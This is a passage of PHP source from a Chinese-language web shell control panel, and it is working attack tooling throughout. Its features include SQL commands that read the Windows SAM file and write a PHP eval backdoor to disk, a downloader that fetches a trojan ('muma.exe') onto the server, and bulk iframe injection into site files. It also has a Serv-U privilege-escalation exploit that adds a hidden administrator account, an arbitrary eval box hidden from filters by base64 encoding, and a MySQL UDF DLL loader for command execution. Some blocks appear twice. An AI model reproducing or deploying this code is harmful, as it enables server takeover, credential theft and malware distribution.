		else $MSG_BOX = '连接MYSQL失败';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'envl.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '下载文件失败';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F:/web/bak.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
END;
html_base();
print<<<END
function SubmitUrl(){
			document.getElementById('msql').value = base64encode(document.getElementById('msql').value);
			document.getElementById('nform').submit();
}
</script>
<form method="POST" name="nform" id="nform">
<center><div class="actall"><a href="?eanver=sqlshell">[MYSQL执行语句]</a>
<a href="?eanver=sqlshell&o=u">[MYSQL上传文件]</a>
<a href="?eanver=sqlshell&o=d">[MYSQL下载文件]</a></div>
<div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(myaddress)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
			}
			else $MSG_BOX = '插入临时表失败';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '创建临时表失败';
	}
print<<<END
<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		$msql = base64_decode($msql);
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = '执行SQL语句成功<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<textarea name="msql" id="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>显示版本</option>
	<option value="1">导出文件</option>
	<option value="2">写入文件</option>
	<option value="3">开启外连</option>
</select>
<input type="button" value="执行" onclick="SubmitUrl();" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	break;

    case "downloader":
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress).'/muma.exe');
print<<<END
	<form method="POST">
    <div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
    <div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
    <div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法读取要下载的数据';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载文件成功' : '下载文件失败';
		echo '</div>';
	}
	break;

	case "issql":
	session_start();
  if($_POST['sqluser'] && $_POST['sqlpass']){
    $_SESSION['sql_user'] = $_POST['sqluser'];
    $_SESSION['sql_password'] = $_POST['sqlpass'];
  }
  if($_POST['sqlhost']){$_SESSION['sql_host'] = $_POST['sqlhost'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['sqlport']){$_SESSION['sql_port'] = $_POST['sqlport'];}
  else{$_SESSION['sql_port'] = '3306';}
  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      die(html_a('?eanver=sqlshell','连接失败请返回'));
    }
  }
  else{
    die(html_a('?eanver=sqlshell','连接失败请返回'));
  }
  $query = mysql_query("SHOW DATABASES",$sqlcon);
  html_n('<tr><td>数据库列表:');
  while($db = mysql_fetch_array($query)) {
		html_a('?eanver=issql&db='.$db['Database'],$db['Database']);
		echo '&nbsp;&nbsp;';
	}
  html_n('</td></tr>');
  if($_GET['db']){
  	css_js("3");
    mysql_select_db($_GET['db'], $sqlcon);
    html_n('<tr><td><form method="POST" name="DbForm"><textarea name="sql" COLS="80" ROWS="3">'.$_POST['sql'].'</textarea><br>');
    html_select(array(0=>"--SQL语法--",7=>"添加数据",8=>"删除数据",9=>"修改数据",10=>"建数据表",11=>"删数据表",12=>"添加字段",13=>"删除字段"),0,"onchange='return Full(options[selectedIndex].value)'");
    html_input("submit","doquery","执行");
    html_a("?eanver=issql&db=".$_GET['db'],$_GET['db']);
    html_n('--->');
    html_a("?eanver=issql&db=".$_GET['db']."&table=".$_GET['table'],$_GET['table']);
    html_n('</form><br>');
  	if(!empty($_POST['sql'])){
			if (@mysql_query($_POST['sql'],$sqlcon)) {
				echo "执行SQL语句成功";
			}else{
				echo "出错: ".mysql_error();
			}
  	}
    if($_GET['table']){
      html_n('<table border=1><tr>');
      $query = "SHOW COLUMNS FROM ".$_GET['table'];
      $result = mysql_query($query,$sqlcon);
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields,$row['Field']);
        html_n('<td><font color=#FFFF44>'.$row['Field'].'</font></td>');
      }
      html_n('</tr><tr>');
      $result = mysql_query("SELECT * FROM ".$_GET['table'],$sqlcon) or die(mysql_error());
      while($text = @mysql_fetch_assoc($result)){
      	foreach($fields as $row){
      		if($text[$row] == "") $text[$row] = 'NULL';
      		html_n('<td>'.$text[$row].'</td>');
      	}
      	echo '</tr>';
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        html_n("<tr><td><a href='?eanver=issql&db=".$_GET['db']."&table=".$row[0]."'>".$row[0]."</a></td></tr>");
      }
    }
  }
	break;

    case "downloader":
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress).'/muma.exe');
print<<<END
	<form method="POST">
    <div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
    <div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
    <div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法读取要下载的数据';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载文件成功' : '下载文件失败';
		echo '</div>';
	}
	break;

	case "issql":
	session_start();
  if($_POST['sqluser'] && $_POST['sqlpass']){
    $_SESSION['sql_user'] = $_POST['sqluser'];
    $_SESSION['sql_password'] = $_POST['sqlpass'];
  }
  if($_POST['sqlhost']){$_SESSION['sql_host'] = $_POST['sqlhost'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['sqlport']){$_SESSION['sql_port'] = $_POST['sqlport'];}
  else{$_SESSION['sql_port'] = '3306';}
  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      die(html_a('?eanver=sqlshell','连接失败请返回'));
    }
  }
  else{
    die(html_a('?eanver=sqlshell','连接失败请返回'));
  }
  $query = mysql_query("SHOW DATABASES",$sqlcon);
  html_n('<tr><td>数据库列表:');
  while($db = mysql_fetch_array($query)) {
		html_a('?eanver=issql&db='.$db['Database'],$db['Database']);
		echo '&nbsp;&nbsp;';
	}
  html_n('</td></tr>');
  if($_GET['db']){
  	css_js("3");
    mysql_select_db($_GET['db'], $sqlcon);
    html_n('<tr><td><form method="POST" name="DbForm" id="DbForm"><textarea name="sql" id="sql" COLS="80" ROWS="3">'.$_POST['sql'].'</textarea><br>');
    html_select(array(0=>"--SQL语法--",7=>"添加数据",8=>"删除数据",9=>"修改数据",10=>"建数据表",11=>"删数据表",12=>"添加字段",13=>"删除字段"),0,"onchange='return Full(options[selectedIndex].value)'");
    html_input("submit","doquery","执行");
    html_a("?eanver=issql&db=".$_GET['db'],$_GET['db']);
    html_n('--->');
    html_a("?eanver=issql&db=".$_GET['db']."&table=".$_GET['table'],$_GET['table']);
    html_n('</form><br>');
  	if(!empty($_POST['sql'])){
			if (@mysql_query($_POST['sql'],$sqlcon)) {
				echo "执行SQL语句成功";
			}else{
				echo "出错: ".mysql_error();
			}
  	}
    if($_GET['table']){
      html_n('<table border=1><tr>');
      $query = "SHOW COLUMNS FROM ".$_GET['table'];
      $result = mysql_query($query,$sqlcon);
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields,$row['Field']);
        html_n('<td><font color=#FFFF44>'.$row['Field'].'</font></td>');
      }
      html_n('</tr><tr>');
      $result = mysql_query("SELECT * FROM ".$_GET['table'],$sqlcon) or die(mysql_error());
      while($text = @mysql_fetch_assoc($result)){
      	foreach($fields as $row){
      		if($text[$row] == "") $text[$row] = 'NULL';
      		html_n('<td>'.$text[$row].'</td>');
      	}
      	echo '</tr>';
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        html_n("<tr><td><a href='?eanver=issql&db=".$_GET['db']."&table=".$row[0]."'>".$row[0]."</a></td></tr>");
      }
    }
  }
	break;

	case "upfiles":
	html_n('<tr><td>服务器限制上传单个文件大小: '.@get_cfg_var('upload_max_filesize').'<form method="POST" enctype="multipart/form-data">');
	html_input("text","uppath",root_dir,"<br>上传到路径: ","51");
print<<<END
<SCRIPT language="JavaScript">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  <!--删除选择-->
  newcell=newRow.insertCell()
  newcell.innerHTML="<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert("请选择一个要删除的对象");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width="100%" border=0>
          <tr>
            <td width="7%"><input class="button01" type="button"  onclick="addTank()" value=" 添 加 " name="button2"/>
            <input name="button3"  type="button" class="button01" onClick="delTank()" value="删除" />
            </td>
          </tr>
</table>
<table  id="tank" width="100%" border="0" cellpadding="1" cellspacing="1" >
<tr><td>请选择要上传的文件：</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>
END;
	html_n('<br><input type="submit" name="upfiles" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location=\'?eanver=main&path='.root_dir.'\';" style="width:80px;">');
	if($_POST['upfiles']){
		foreach ($_FILES["upfile"]["error"] as $key => $error){
			if ($error == UPLOAD_ERR_OK){
				$tmp_name = $_FILES["upfile"]["tmp_name"][$key];
				$name = $_FILES["upfile"]["name"][$key];
				$uploadfile = str_path($_POST['uppath'].'/'.$name);
				$upload = @copy($tmp_name,$uploadfile) ? $name.$msg[2] : @move_uploaded_file($tmp_name,$uploadfile) ? $name.$msg[2] : $name.$msg[3];
				echo '<br><br>'.$upload;
			}
		}
	}
	html_n('</form>');
	break;

	case "guama":
	$patht = isset($_POST['path']) ? $_POST['path'] : root_dir;
	$typet = isset($_POST['type']) ? $_POST['type'] : ".html|.shtml|.htm|.asp|.php|.jsp|.cgi|.aspx";
	$codet = isset($_POST['code']) ? $_POST['code'] : "<iframe src=\"http://localhost/eanver.htm\" width=\"1\" height=\"1\"></iframe>";
	html_n('<tr><td>文件类型请用"|"隔开,也可以是指定文件名.<form method="POST"><br>');
	html_input("text","path",$patht,"路径范围","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_input("text","type",$typet,"<br><br>文件类型","60");
	html_text("code","67","5",$codet);
	html_n('<br><br>');
	html_radio("批量挂马","批量清马","guama","qingma");
	html_input("submit","passreturn","开始");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>目标文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($patht,$codet,$_POST['return'],$bool,$typet);
	}
	break;

	case "tihuan":
	html_n('<tr><td>此功能可批量替换文件内容,请小心使用.<br><br><form method="POST">');
	html_input("text","path",root_dir,"路径范围","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_text("newcode","67","5",$_POST['newcode']);
	html_n('<br><br>替换为');
	html_text("oldcode","67","5",$_POST['oldcode']);
	html_input("submit","passreturn","替换","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>目标文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['newcode'],"tihuan",$bool,$_POST['oldcode']);
	}
	break;

	case "scanfile":
	css_js("4");
	html_n('<tr><td>此功能可很方便的搜索到保存MYSQL用户密码的配置文件,用于提权.<br>当服务器文件太多时,会影响执行速度,不建议使用目录遍历.<form method="POST" name="sform"><br>');
	html_input("text","path",root_dir,"路径名","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_input("text","code",$_POST['code'],"<br><br>关键字","40");
	html_select(array("--MYSQL配置文件--","Discuz","PHPWind","phpcms","dedecms","PHPBB","wordpress","sa-blog","o-blog"),0,"onchange='return Fulll(options[selectedIndex].value)'");
	html_n('<br><br>');
	html_radio("搜索文件名","搜索包含文字","scanfile","scancode");
	html_input("submit","passreturn","搜索");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>找到文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['code'],$_POST['return'],$bool);
	}
	break;

	case "scanphp":
	html_n('<tr><td>原理是根据特征码定义的,请查看代码判断后再进行删除.<form method="POST"><br>');
	html_input("text","path",root_dir,"查找范围","40");
	html_input("checkbox","pass","","使用目录遍历<br><br>脚本类型","",true);
	html_select(array("php" => "PHP","asp" => "ASP","aspx" => "ASPX","jsp" => "JSP"));
	html_input("submit","passreturn","查找","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>找到文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['class'],"scanphp",$bool);
	}
	break;

	case "port":
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|23|25|80|110|135|139|445|1433|3306|3389|8080|43958|5631|2049|873|999';
print<<<END
<form method="POST">
<div class="actall">扫描IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
<div class="actall">端口号 <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
	{
		echo '<div class="actall">';
		$ports = explode('|', $_POST['port']);
		for($i = 0;$i < count($ports);$i++)
		{
			$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,2);
			echo $fp ? '<font color="#FF0000">开放端口 ---> '.$ports[$i].'</font><br>' : '关闭端口 ---> '.$ports[$i].'<br>';
			ob_flush();
			flush();
		}
		echo '</div>';
	}
	break;


	case "getcode":
if (isset($_POST['url'])) {$proxycontents = @file_get_contents($_POST['url']);echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";exit;}
print<<<END
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form method="POST" target="proxyframe">
  <tr class="firstalt">
	<td align="center"><b>在线代理</b></td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : {$_SERVER['SERVER_NAME']}</li></ul></td>
  </tr>
  <tr class="firstalt">
	<td align="center" height=40  >URL: <input name="url" value="about:blank" type="text"  class="input" size="100" >
 <input name="" value="浏览" type="submit"  class="input" size="30" >
</td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="about:blank"></iframe></td>
  </tr>
</form></table>
END;
	break;

	case "servu":
	$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
print<<<END
<div class="actall"><a href="?eanver=servu">[执行命令]</a> <a href="?eanver=servu&o=adduser">[添加用户]</a></div>
<form method="POST">
	<div class="actall">ServU端口 <input name="SUPort" type="text" value="43958" style="width:300px"></div>
	<div class="actall">ServU用户 <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
	<div class="actall">ServU密码 <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser')
{
print<<<END
<div class="actall">帐号 <input name="user" type="text" value="mysql$" style="width:200px">
密码 <input name="password" type="text" value="envl" style="width:200px">
目录 <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
END;
}
else
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user mysql$ envl /add & net localgroup administrators mysql$ /add" style="width:600px"><br>
<input name="user" type="hidden" value="envl">
<input name="password" type="hidden" value="envl">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
}
echo '<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>';
	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
	{
		echo '<div class="actall">';
		$sendbuf = "";
		$recvbuf = "";
		$domain  = "-SETDOMAIN\r\n"."-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n"."-TZOEnable=0\r\n"." TZOKey=\r\n";
		$adduser = "-SETUSERSETUP\r\n"."-IP=0.0.0.0\r\n"."-PortNo=21\r\n"."-User=".$_POST['user']."\r\n"."-Password=".$_POST['password']."\r\n"."-HomeDir=c:\\\r\n"."-LoginMesFile=\r\n"."-Disable=0\r\n"."-RelPaths=1\r\n"."-NeedSecure=0\r\n"."-HideHidden=0\r\n"."-AlwaysAllowLogin=0\r\n"."-ChangePassword=0\r\n".
							 "-QuotaEnable=0\r\n"."-MaxUsersLoginPerIP=-1\r\n"."-SpeedLimitUp=0\r\n"."-SpeedLimitDown=0\r\n"."-MaxNrUsers=-1\r\n"."-IdleTimeOut=600\r\n"."-SessionTimeOut=-1\r\n"."-Expire=0\r\n"."-RatioUp=1\r\n"."-RatioDown=1\r\n"."-RatiosCredit=0\r\n"."-QuotaCurrent=0\r\n"."-QuotaMaximum=0\r\n".
							 "-Maintenance=None\r\n"."-PasswordType=Regular\r\n"."-Ratios=None\r\n"." Access=".$_POST['part']."\|RWAMELCDP\r\n";
		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"],$errno,$errstr, 10);
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "SITE MAINTENANCE\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $domain;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $adduser;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		if(!empty($_POST['SUCommand']))
		{
	 		$exp = @fsockopen("127.0.0.1", "21",$errno,$errstr, 10);
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "USER ".$_POST['user']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = $deldomain;
	 		@fputs($sock, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($sock, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		@fclose($exp);
		}
		@fclose($sock);
		echo '</div>';
	}
	break;

	case "phpcode":
	$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
    if($phpcode!='phpinfo();')$phpcode = htmlspecialchars(base64_decode($phpcode));
	echo '<script language="javascript">';
    html_base();
	echo 'function SubmitUrl(){
			document.getElementById(\'phpcode\').value = base64encode(document.getElementById(\'phpcode\').value);
			document.getElementById(\'sendcode\').submit();
	}</script><tr><td><form method="POST" id="sendcode" >不用写&lt;? ?&gt;标签,此功能优化使用BASE64加密传送，防止恶意代码被拦，用了就知道（小小细节，注定成就）<br><br><textarea COLS="120" ROWS="35" name="phpcode" id="phpcode">'.$phpcode.'</textarea><br><br><input type="button" value="执行" onclick="SubmitUrl();" style="width:80px;">';
	if(!empty($_POST['phpcode'])){
	echo "<br><br>";
    eval(stripslashes(base64_decode($_POST['phpcode'])));
	}
	html_n('</form>');
	break;

	case "myexp":
	$MSG_BOX = '请先导出DLL,再执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件.';
	$info = '命令回显';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = ''; $sqlcmd = 'ver';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		@$mysql64 = isset($_POST['mysql64'])?true:false;if($mysql64){$mysql64='checked';$BH='BH64.dll';}else{$BH='BH.dll';} $mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']; $mpath = File_Str($_POST['mpath']); $sqlcmd = $_POST['sqlcmd'];
		$conn = mysql_connect($mhost.':'.$mport,$muser,$mpass);
		if($conn)
		{
			@mysql_select_db($mdata);
			/*************************************/
			$str=mysql_get_server_info();
			//echo 'MYSQL版本:'.$str."  ";

			if($str[2]>=1){
			$sql="SHOW VARIABLES LIKE '%plugin_dir%'";
			$row=mysql_query($sql,$conn);
			$rows=mysql_fetch_row($row);
			$pa=str_replace('\\','/',$rows[1]);
			$path=$pa.'/'.$BH;

			}else{
			$path='C:/WINDOWS/'.$BH;
			}
			//$mpath=$path;
			if(!empty($mpath))
			{
				$mpath=$mpath;
			}else{
				$mpath=$path;
			}
			/*************************************/
			if((!empty($_POST['outdll'])) && (!empty($mpath)))
			{
				$query = "CREATE TABLE Envl_Temp_Tab (envl BLOB);";
				if(@mysql_query($query,$conn))
				{
					$shellcode = $mysql64?Mysql_shellcode64():Mysql_shellcode();
					$query = "INSERT into Envl_Temp_Tab values (CONVERT(".$shellcode.",CHAR));";
					if(@mysql_query($query,$conn))
					{
						$query = 'SELECT envl FROM Envl_Temp_Tab INTO DUMPFILE \''.$mpath.'\';';
						if(@mysql_query($query,$conn))
						{
							$ap = explode('/', $mpath); $inpath = array_pop($ap);
							$query = 'Create Function sys_eval returns string soname \''.$inpath.'\';';
							$MSG_BOX = @mysql_query($query,$conn) ? '安装DLL成功' : '安装DLL失败'.mysql_error();
						}
						else $MSG_BOX = '导出DLL文件失败'.mysql_error();
					}
					else $MSG_BOX = '写入临时表失败';
					@mysql_query('DROP TABLE Envl_Temp_Tab;',$conn);
				}
				else $MSG_BOX = '创建临时表失败';
			}
			if(!empty($_POST['runcmd']))
			{
				$query = 'select sys_eval("'.$sqlcmd.'");';
				$result = @mysql_query($query,$conn);
				if($result)
				{
					$k = 0; $info = NULL;
					while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;}
					$info = $infotmp;
					$MSG_BOX = '执行成功';
				}
				else $MSG_BOX = '执行失败';
			}
		}
		else $MSG_BOX = '连接MYSQL失败';
	}
print<<<END
<form id="mform" method="POST">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<center><div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div><div class="actall">
加载路径(自动获取) <input type="text" id='dlllj' name="mpath" value="{$mpath}" style="width:500px">
64位MYSQL <input type="checkbox" onclick="document.getElementById('dlllj').value='';" name="mysql64" value="1" {$mysql64} />
<input type="submit" name="outdll" value="安装DLL" style="width:80px;"></div>
<div class="actall">支持高版本MYSQL <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:635px;">
<input type="submit" name="runcmd" value="执行" style="width:80px;">
<br />
<pre>
<textarea style="width:720px;height:300px;">{$info}</textarea>
</pre>
</div></center>
</form>
END;
	break;


	case "mysql_exec":
  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))
  {
  	if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))
	  {
	  	$cookietime = time() + 24 * 3600;
	  	setcookie('m_eanverhost',$_POST['mhost'],$cookietime);
	  	setcookie('m_eanverport',$_POST['mport'],$cookietime);
	  	setcookie('m_eanveruser',$_POST['muser'],$cookietime);
	  	setcookie('m_eanverpass',$_POST['mpass'],$cookietime);
